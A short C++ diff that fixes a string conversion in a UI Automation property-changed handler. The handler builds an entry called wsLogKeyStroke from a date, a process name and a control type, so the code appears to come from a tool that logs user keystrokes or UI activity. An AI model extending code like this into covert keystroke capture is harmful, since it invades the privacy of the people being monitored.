@@ -18,8 +18,9 @@ void MyPropertyChangedEventHandler::HandleOther(IUIAutomationElement* pAutomatio
 		Log(L"Can't get localized control type", DBG);
 		goto exit;
 	}
+	
 
-	wsLogKeyStroke = wsDate + L" " + wsProcName + L" [ " + bLocalizedControlType + L" ]";
+	wsLogKeyStroke = wsDate + L" " + wsProcName + L" [ " + std::wstring(bLocalizedControlType) + L" ]";
 	
 	switch (propId) {
 	case UIA_NamePropertyId:
